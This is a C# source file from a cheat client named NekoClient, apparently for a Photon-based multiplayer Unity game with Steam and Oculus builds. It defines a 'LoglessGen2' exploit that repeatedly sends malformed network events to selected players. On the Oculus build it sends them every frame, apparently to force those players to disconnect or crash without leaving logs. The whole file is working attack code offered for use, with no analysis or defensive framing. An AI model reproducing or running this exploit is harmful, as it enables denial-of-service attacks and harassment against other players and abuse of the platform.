using System.Collections;
using System.Linq;
using UnityEngine;
using NekoClient;
using ExitGames.Client.Photon;
using NekoClient.Wrappers.Reflection;

#if STEAM
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#elif OCULUS
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#endif

namespace NekoClient.Exploits
{
    public class LoglessGen2
    {
        private class Gen2 : UnityEngine.MonoBehaviour
        {
            public Gen2()
            {
                DontDestroyOnLoad(this);
            }

            private IEnumerator Logout()
            {
                int[] targets = Targets.Select(t => t.PhotonActor()).ToArray();

                //byte[] data = new byte[8192 * 54];
                byte[] data = new byte[4] { 1, 3, 3, 7 };

#if STEAM
                CBNIEHEBJME aphbjeengmm = new CBNIEHEBJME()
                {
                    GAKAPNFMBOG = targets,
                    EPMEEBIJECL = CAPDHEAGDEO.DoNotCache,
                    OHLOOGLFPGD = 0,
                    PHNJDFOHMGK = PKLOAEBCFGG.Others,
                    GCJHNJBEGPC = false,
                    HPHMEHCFCKP = false
                };

                JAKFOOOBJKF.IJAIGNJJHEA(1, data, false, aphbjeengmm);
                JAKFOOOBJKF.IJAIGNJJHEA(1, data, false, aphbjeengmm);
#elif OCULUS
                /* PRE 2019.1.1
                CBNIEHEBJME aphbjeengmm = new CBNIEHEBJME()
                {
                    GAKAPNFMBOG = targets,
                    EPMEEBIJECL = CAPDHEAGDEO.DoNotCache,
                    OHLOOGLFPGD = 0,
                    PHNJDFOHMGK = PKLOAEBCFGG.Others,
                    GCJHNJBEGPC = false,
                    HPHMEHCFCKP = false
                };

                JAKFOOOBJKF.IJAIGNJJHEA(1, data, false, aphbjeengmm);
                JAKFOOOBJKF.IJAIGNJJHEA(1, data, false, aphbjeengmm);*/

                KGGLJCNBJAN bcedkjfajpj = new KGGLJCNBJAN()
                {
                    PCGDEMCFOKB = targets,
                    JEILJCADMPB = LMPBAPNCBEI.DoNotCache,
                    GDOCNFKJGAA = 0,
                    DKEMPAKCCJH = MBKLPNHOANH.Others
                };

                void Send()
                {
                    DKGBGACHCGF.GNFOLFNJHHC(1, data, bcedkjfajpj, new SendOptions
                    {
                        Channel = FPFAHPIJFKA.DLPFGCGHFEI(),
                        Reliability = true
                    });
                }

                while (true)
                {
                    Send();
                    yield return new WaitForEndOfFrame();
                }
#endif
            }

            public void Trigger()
            {
                StartCoroutine(Logout());
            }

            private PhotonPlayer[] Targets;

            public void SetTarget(PhotonPlayer[] targets)
            {
                Targets = targets;
            }
        }

        private Gen2 gen2;

        private void InitializeObject()
        {
            GameObject targetObject = new GameObject();
            gen2 = targetObject.AddComponent<Gen2>();
            UnityEngine.Object.DontDestroyOnLoad(targetObject);
        }

        public LoglessGen2(object target)
        {
            InitializeObject();

            gen2.SetTarget(new PhotonPlayer[] { (PhotonPlayer)target });
        }

        public LoglessGen2(object[] targets)
        {
            InitializeObject();

            gen2.SetTarget((PhotonPlayer[])targets);
        }

        public void Trigger()
        {
            gen2.Trigger();
        }

        public void Stop()
        {
            gen2.StopAllCoroutines();
        }
    }
}